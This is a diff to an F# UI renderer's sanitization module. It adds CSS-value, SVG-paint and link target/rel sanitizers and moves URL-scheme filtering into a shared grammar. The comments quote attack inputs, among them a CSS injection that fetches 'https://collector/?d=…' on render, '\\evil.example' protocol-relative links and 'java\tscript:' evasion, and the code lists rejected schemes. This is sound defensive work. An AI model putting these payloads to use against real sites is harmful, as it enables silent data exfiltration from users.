@@ -172,154 +172,143 @@ let sanitizeExtraAttributes (attrs: Map<string, string>) : Map<string, string> =
                 acc)
         Map.empty
 
-// ─── URL-scheme sanitization ───────────────────────────────────────────────
+// ─── CSS-value sanitization (Phase 1523) ───────────────────────────────────
+//
+//  The renderer-side re-export of `Fuaran.UI.EmissionGrammar`'s CSS grammar,
+//  on exactly the terms the URL floor below is re-exported: the RULE lives in
+//  `Fuaran.UI` so `PreEmitValidate` can name a refusal before any renderer
+//  runs, and the NAME lives here so an emission site adopts it by replacing one
+//  call.
+//
+//  What the finding was. `LayoutMode.Grid.templateColumns` decodes as a free
+//  string, and four server renderers concatenated it into
+//  `style="grid-template-columns:…"` with no rule at all — so
+//  `"1fr;background:url(https://collector/?d=…)"` closed the declaration, opened
+//  a second one, and fetched on RENDER, with no user act, outside the egress
+//  policy that governs every `href` and `src` in the same document. The React
+//  client assigned a style OBJECT, where the browser drops the invalid value
+//  silently. So the same tree was an exfiltration channel on four hosts and
+//  inert on the fifth, which is precisely the disagreement the wire format
+//  exists to rule out.
 
-/// Schemes the renderer accepts for `href` / `src` props. Same-origin
-/// relative paths (`/foo`, `./foo`, `foo`, `#frag`) are accepted as a
-/// separate branch — they have no scheme to validate.
-let private allowedUrlSchemes =
-    Set.ofList [ "http"; "https"; "mailto"; "tel"; "ftp"; "sftp" ]
+/// `true` when this string is safe to concatenate into a CSS declaration.
+/// See `Fuaran.UI.EmissionGrammar.isSafeCssValue` for the rule and for what it
+/// deliberately does NOT promise.
+let isSafeCssValue (value: string) : bool =
+    Fuaran.UI.EmissionGrammar.isSafeCssValue value
 
-/// Schemes the renderer ALWAYS rejects, regardless of caller intent.
-let private rejectedUrlSchemes = Set.ofList [ "javascript"; "vbscript"; "file" ]
+/// The CSS value to emit: the value when it passes, the empty string when it
+/// does not. The one-call seam a style-emitting site adopts.
+let sanitizeCssValue (value: string) : string =
+    Fuaran.UI.EmissionGrammar.sanitizeCssValue value
 
-let private trimAndLower (s: string) : string = s.Trim().ToLowerInvariant()
+/// The attribute an emission site attaches beside a refused CSS value, so the
+/// refusal is visible in the DOCUMENT rather than only in a log — the same
+/// posture `egressRefusalAttribute` keeps below.
+[<Literal>]
+let cssRefusalAttribute = Fuaran.UI.EmissionGrammar.cssRefusalAttribute
 
-/// §19 rule 1 — normalise a URL string exactly as the WHATWG URL Standard's basic
-/// URL parser does before it parses anything, ASCII-exact, in this order:
-///
-///   1. remove leading and trailing C0 control or space — ALL of U+0000–U+0020,
-///      not merely the whitespace subset;
-///   2. remove every U+0009 / U+000A / U+000D from anywhere in what remains.
-///
-/// This is deliberately NOT `String.Trim()`. A native trim answers a different
-/// question in every language — .NET, JS, Go and Rust leave U+001C–U+001F where
-/// Python removes them; JS keeps U+0085 where the other four drop it — and all of
-/// them remove non-ASCII whitespace (U+00A0, U+2028, …) that the parser keeps.
-/// The floor's whole purpose is that a tree vetted on one host is safe on
-/// another, so the normalisation has to be defined by the parser that will
-/// actually consume the string rather than by the host's standard library.
-///
-/// Step 2 is those three code points ONLY: the parser removes U+000B and U+000C
-/// at the edges (step 1) and KEEPS them in the interior, so `/<VT>/host/x` is an
-/// ordinary same-origin path and must stay one.
-let private normalizeUrlForFloor (s: string) : string =
-    let isC0OrSpace (c: char) = c <= ' '
-    let mutable lo = 0
-    let mutable hi = s.Length - 1
-
-    while lo <= hi && isC0OrSpace s[lo] do
-        lo <- lo + 1
-
-    while hi >= lo && isC0OrSpace s[hi] do
-        hi <- hi - 1
-
-    let sb = System.Text.StringBuilder(hi - lo + 1)
-
-    for i in lo..hi do
-        match s[i] with
-        | '\t'
-        | '\n'
-        | '\r' -> ()
-        | c -> sb.Append c |> ignore
-
-    sb.ToString()
-
-/// Split a URL into `(schemeOpt, rest)`. A URL without a `:` (e.g. a
-/// relative path, a fragment, an empty string) returns `(None, url)`.
-/// Whitespace and control chars inside the scheme region defeat the
-/// match (some classic XSS payloads use `java\tscript:` to evade naïve
-/// prefix checks — we normalise by stripping ASCII whitespace + C0
-/// controls from the scheme candidate before classifying).
-let private extractScheme (url: string) : string option * string =
-    if isNull url then
-        None, ""
+/// The CSS value to emit plus the refusal attributes to splice, given the SLOT
+/// name the value came from. The slot name — never the value — is what the
+/// marker carries, because a refused value is the payload.
+let sanitizeCssValueForSlot (slot: string) (value: string) : string * (string * string) list =
+    if isSafeCssValue value then
+        (if isNull value then "" else value), []
     else
-        // Look for the first ':' BEFORE any '/'. A relative path like
-        // "foo/bar:baz" has no scheme; "foo:bar" does.
-        let mutable colonIdx = -1
-        let mutable slashIdx = -1
-        let mutable i = 0
+        Fuaran.UI.EmissionGrammar.cssRefusalValue, [ cssRefusalAttribute, slot ]
 
-        while i < url.Length && colonIdx < 0 && slashIdx < 0 do
-            let ch = url[i]
-
-            if ch = ':' then
-                colonIdx <- i
-            elif ch = '/' || ch = '?' || ch = '#' then
-                slashIdx <- i
-
-            i <- i + 1
-
-        if colonIdx < 0 || (slashIdx >= 0 && slashIdx < colonIdx) then
-            None, url
-        else
-            // Strip whitespace + control chars from the scheme candidate
-            // so `java\tscript`, ` javascript`, `JAVASCRIPT` all classify
-            // as `javascript`.
-            let raw = url.Substring(0, colonIdx)
-
-            let cleaned =
-                raw |> Seq.filter (fun ch -> int ch > 0x20) |> Seq.toArray |> System.String
-
-            Some(trimAndLower cleaned), url
-
-/// `true` when a schemeless URL is PROTOCOL-RELATIVE — it starts with two
-/// slash-ish characters, in any mix of `/` and `\`.
+/// The SVG paint (`fill` / `stroke`) to emit: the value when it is a colour in
+/// the closed grammar, `"none"` when it is not.
 ///
-/// All four spellings (`//host`, `/\host`, `\\host`, `\/host`) resolve
-/// off-origin, because WHATWG URL parsing treats `\` as `/` for a special
-/// scheme: the browser normalises the pair to `//` and reads what follows as an
-/// AUTHORITY, not a path. Phase 298 closed the first two; the backslash-leading
-/// pair fell through to the "no scheme → relative, allowed" arm, so a `Link`
-/// href of `\\evil.example/x` rendered as a live off-origin link and an
-/// `Image.src` became an off-origin request leaking the Referer.
-///
-/// A SINGLE leading backslash (`\evil.example`) is deliberately not caught: the
-/// same WHATWG rule reads it as `/evil.example`, an ordinary same-origin path,
-/// which is exactly what the `/`-spelling is allowed to be.
-let private isProtocolRelative (url: string) : bool =
-    let slashish (c: char) = c = '/' || c = '\\'
-    url.Length >= 2 && slashish url[0] && slashish url[1]
+/// A paint slot needs a POSITIVE grammar where a generic CSS value does not,
+/// and the reason is the whole of the finding: `url(https://collector/x)`
+/// contains no forbidden character, so it passes `isSafeCssValue` — and in an
+/// SVG `fill` it names a paint server, which the user agent fetches. Only
+/// naming what a colour may BE excludes it.
+let sanitizePaintValue (value: string) : string =
+    Fuaran.UI.EmissionGrammar.sanitizePaintValue value
+
+// ─── Anchor token slots — `target` / `rel` (Phase 1523) ────────────────────
+//
+//  Re-exported for the same reason and on the same terms. `Link.rel` and
+//  `Link.target` are free strings on the wire and were emitted VERBATIM by
+//  every renderer, so `rel="opener"` on a `_blank` link re-enabled
+//  `window.opener` — handing the opened document a live reference to the
+//  opening one — and `target` could name an arbitrary browsing context.
+//
+//  The narrowing of the WIRE is a §4b amendment PROPOSAL
+//  (`docs/proposals/link-target-rel-narrowing.md`); no decoder narrows in this
+//  change-set. What every renderer does now is emit only what these return.
+
+/// The `target` to emit, or `None` to omit the attribute.
+let sanitizeLinkTarget (target: string) : string option =
+    Fuaran.UI.EmissionGrammar.sanitizeLinkTarget target
+
+/// The `rel` attribute value to emit, or `None` to omit it — the declared
+/// tokens filtered to the closed set, plus `noopener noreferrer` forced when
+/// the sanitised target is `_blank`.
+let sanitizeLinkRelAttribute (rel: string option) (sanitizedTarget: string option) : string option =
+    Fuaran.UI.EmissionGrammar.sanitizeLinkRelAttribute rel sanitizedTarget
+
+/// The two anchor attributes a link emits, resolved together: the declared
+/// `target` and `rel` in, the pair to emit out. One call, because the `rel`
+/// rule DEPENDS on the sanitised target (the forced `noopener noreferrer`), so
+/// a site that sanitised them independently would get the dependency wrong in
+/// exactly the case that matters.
+let sanitizeLinkAnchor (target: string option) (rel: string option) : string option * string option =
+    let safeTarget =
+        match target with
+        | None -> None
+        | Some t -> sanitizeLinkTarget t
+
+    safeTarget, sanitizeLinkRelAttribute rel safeTarget
+
+// ─── URL-scheme sanitization ───────────────────────────────────────────────
+//
+//  Phase 1523 — the RULE moved to `Fuaran.UI.EmissionGrammar`, beside
+//  `WireLimits`, and this section is now the renderer-side re-export of it.
+//
+//  Why it moved rather than being duplicated: applied only here, the floor was
+//  a RENDER-time rule, so it ran after decode, after `validate`, after the
+//  op-stream persisted the tree and after the AI-tools surface introspected it.
+//  A `javascript:` href therefore decoded clean, validated clean, persisted and
+//  introspected as written, and was refused silently at render — so a model was
+//  never told, the demand loop counted nothing, and a HEADLESS consumer (one
+//  that decodes and persists without ever constructing a renderer) met no floor
+//  at all. In `Fuaran.UI` the same rule is reachable by `PreEmitValidate`, which
+//  names the refusal before any renderer runs.
+//
+//  Why the names stay HERE: every emission site in three renderer projects
+//  calls `Sanitize.sanitizeUrl` / `sanitizeUrlOrBlank`, and every one of those
+//  call sites is a place the floor is already correct. Re-exporting keeps the
+//  move a one-file change with zero call-site churn, which is what makes it
+//  safe to make — a 40-call-site rename would have been the risky half of an
+//  otherwise mechanical move.
+
+//  The two scheme SETS are not re-exported under private names here: nothing in
+//  this file consults them any more (the decision they fed is
+//  `Fuaran.UI.EmissionGrammar.sanitizeUrl`), and a private binding kept only to mirror a
+//  name is a second place the set could appear to be edited. They are public on
+//  `EmissionGrammar` for a host that wants to read what the floor admits.
+
+/// §19 rule 1 — the WHATWG URL Standard's own pre-parse normalisation. See
+/// `Fuaran.UI.EmissionGrammar.normalizeUrlForFloor` for why it is not `String.Trim()`.
+let private normalizeUrlForFloor (s: string) : string =
+    Fuaran.UI.EmissionGrammar.normalizeUrlForFloor s
+
+/// Split a URL into `(schemeOpt, rest)`. See `Fuaran.UI.EmissionGrammar.extractScheme`.
+let private extractScheme (url: string) : string option * string =
+    Fuaran.UI.EmissionGrammar.extractScheme url
 
 /// Returns the sanitized URL or `None` if the URL's scheme is rejected.
-/// `data:` is rejected by default for href/src (image data: URLs are a
-/// known XSS vector when fed into SVG); callers that need data: URLs
-/// must use the `Trust.raw` opt-in seam (not in
-/// this commit's surface).
+/// `data:` is rejected by default for href/src (image data: URLs are a known
+/// XSS vector when fed into SVG); callers that need data: URLs must use the
+/// `Trust.raw` opt-in seam (not in this commit's surface).
+///
+/// The DECISION lives in `Fuaran.UI.EmissionGrammar.sanitizeUrl`; this is the renderer's
+/// name for it. The two cannot disagree, which is the point of the move.
 let sanitizeUrl (url: string) : string option =
-    if isNull url then
-        None
-    else
-        // §19 rule 1 — the URL Standard's own pre-parse normalisation, NOT `.Trim()`.
-        // See `normalizeUrlForFloor`. Rule 1's output is also what gets EMITTED on
-        // acceptance, so an accepted URL carrying an interior tab loses it — which is
-        // what the browser would have parsed anyway.
-        let trimmed = normalizeUrlForFloor url
-
-        if trimmed = "" then
-            // Empty href / src — caller's choice; renderer passes it through
-            // (React renders `href=""` as a same-page link, which is the
-            // documented HTML behaviour).
-            Some trimmed
-        else
-            match extractScheme trimmed with
-            | None, _ when isProtocolRelative trimmed ->
-                // Protocol-relative URL (`//host/path`) — has no scheme, so the schemeless branch would
-                // otherwise admit it, but the browser resolves it to an OFF-ORIGIN `https://host/path`,
-                // defeating the same-origin intent. Reject (Phase 298; the backslash spellings
-                // `\\host` / `\/host` added by Phase 784 — see `isProtocolRelative`).
-                None
-            | None, _ ->
-                // No scheme → relative / fragment / same-origin. Allowed.
-                Some trimmed
-            | Some scheme, _ when rejectedUrlSchemes.Contains scheme -> None
-            | Some scheme, _ when allowedUrlSchemes.Contains scheme -> Some trimmed
-            | Some _, _ ->
-                // Unknown scheme — reject by default. Conservative posture;
-                // adding a scheme to the allowlist is a one-line additive
-                // change for hosts that need it.
-                None
+    Fuaran.UI.EmissionGrammar.sanitizeUrl url
 
 /// Convenience: returns the URL itself if accepted, or the literal string
 /// `"about:blank"` if rejected. Used by renderer call sites that have to
@@ -390,6 +379,24 @@ type EgressClass =
     /// the note on the effect seam's classification — but it is scoped here
     /// so a policy can speak about it in the same vocabulary.
     | FileRead
+    /// An API CALL the tree asks for (`Action.Call`) — Phase 1523.
+    ///
+    /// Scoped separately from every class above, and the separation is the
+    /// point rather than a taxonomy preference. `Media` is fetch-and-display
+    /// and `Embed` is fetch-and-execute; a `Call` is fetch-and-INGEST — the
+    /// response is decoded and, with `into: State k`, written into the store
+    /// the rest of the tree reads from and renders. So a `Call` is the only
+    /// class that is simultaneously an EXFILTRATION channel (the endpoint is a
+    /// tree-declared URL, and one click sends the browser to it with the user's
+    /// ambient credentials) and an INJECTION channel (whatever answers becomes
+    /// tree-visible data).
+    ///
+    /// A composition that declared a CDN for image egress has said nothing
+    /// about which APIs it will call and ingest, which is exactly why folding
+    /// this into `Media` would let the first declaration answer the second
+    /// question — the same argument `Embed` makes against `Media`, one step
+    /// further along.
+    | Call
 
 module EgressClass =
 
@@ -402,6 +409,7 @@ module EgressClass =
         | EgressClass.Route -> "route"
         | EgressClass.Download -> "download"
         | EgressClass.FileRead -> "fileRead"
+        | EgressClass.Call -> "call"
 
     /// Every class, in wire order. Used by `allowOrigin` when a rule is
     /// declared without a class scope (which means "every class").
@@ -411,7 +419,8 @@ module EgressClass =
           EgressClass.Embed
           EgressClass.Route
           EgressClass.Download
-          EgressClass.FileRead ]
+          EgressClass.FileRead
+          EgressClass.Call ]
 
     /// Parse a wire spelling. Case-insensitive on the caller's behalf; an
     /// unknown name is `None` rather than a silently-ignored rule, because a
@@ -1045,20 +1054,74 @@ let sanitizeMarkdownHtml (html: string) : string =
 
         result <- stripEventHandlers result
 
-        // Strip `javascript:` / `vbscript:` URLs in href / src values.
+        // Strip `javascript:` / `vbscript:` URLs — TAG-INTERIOR ANCHORED, the
+        // same discipline `stripEventHandlers` already keeps and for the same
+        // reason (Phase 1523).
+        //
+        // Unanchored, this sweep rewrote VISIBLE PROSE. The markdown source
+        // `Never write \`javascript:\` in an href` renders to a `<code>` element
+        // whose TEXT is the literal token, and the scan replaced it with
+        // `about:blank` — so a document explaining the hazard could not state
+        // it, and the reader was shown a sentence the author never wrote. The
+        // same applies to any body text mentioning the scheme: a security
+        // changelog, a code sample, a refusal message quoted back to a user.
+        //
+        // A real `javascript:` URL can only do harm as the VALUE of an
+        // attribute — `href`, `src`, `action`, `formaction`, `xlink:href`,
+        // `data`, `poster`. Every one of those sits inside a `<…>` tag, so
+        // restricting the scan to tag interiors is not a heuristic narrowing:
+        // it is the precise set of positions where the token is a URL rather
+        // than a word. Outside a tag the token is text, and the markdown
+        // renderer has already escaped that text by construction — which is
+        // what makes leaving it alone safe as well as correct.
+        //
+        // The interior test is the same single pass `stripEventHandlers` uses:
+        // `<` opens an interior, `>` closes it. That is approximate on
+        // arbitrary HTML (a `>` inside a quoted attribute value ends the
+        // interior early) and sound on this function's documented input, the
+        // deterministic GFM renderer's output. Erring early ends the interior
+        // and therefore SKIPS a rewrite — the direction of error that leaves
+        // prose intact — which is why the precondition note above matters as
+        // much as it does.
         let dangerousProtocols = [ "javascript:"; "vbscript:" ]
 
         for proto in dangerousProtocols do
             let mutable keepGoing = true
+            let mutable searchFrom = 0
 
             while keepGoing do
-                let i = result.ToLowerInvariant().IndexOf(proto, StringComparison.Ordinal)
+                let lower = result.ToLowerInvariant()
+                let i = lower.IndexOf(proto, searchFrom, StringComparison.Ordinal)
 
                 if i < 0 then
                     keepGoing <- false
                 else
-                    // Replace with `about:blank` so the surrounding attribute
-                    // remains structurally valid.
-                    result <- result.Substring(0, i) + "about:blank" + result.Substring(i + proto.Length)
+                    // Is index `i` inside a tag? Scan back for the nearest `<`
+                    // or `>`: a `<` means the interior is open here, a `>` (or
+                    // the start of the document) means it is not.
+                    let mutable j = i - 1
+                    let mutable insideTag = false
+                    let mutable settled = false
+
+                    while j >= 0 && not settled do
+                        if lower[j] = '<' then
+                            insideTag <- true
+                            settled <- true
+                        elif lower[j] = '>' then
+                            settled <- true
+                        else
+                            j <- j - 1
+
+                    if insideTag then
+                        // Replace with `about:blank` so the surrounding
+                        // attribute remains structurally valid.
+                        result <- result.Substring(0, i) + "about:blank" + result.Substring(i + proto.Length)
+                        searchFrom <- i + "about:blank".Length
+                    else
+                        // Body text. Leave it exactly as the author wrote it and
+                        // resume the scan past this occurrence — advancing is
+                        // what keeps the loop terminating now that a match no
+                        // longer always shortens the string.
+                        searchFrom <- i + proto.Length
 
         result
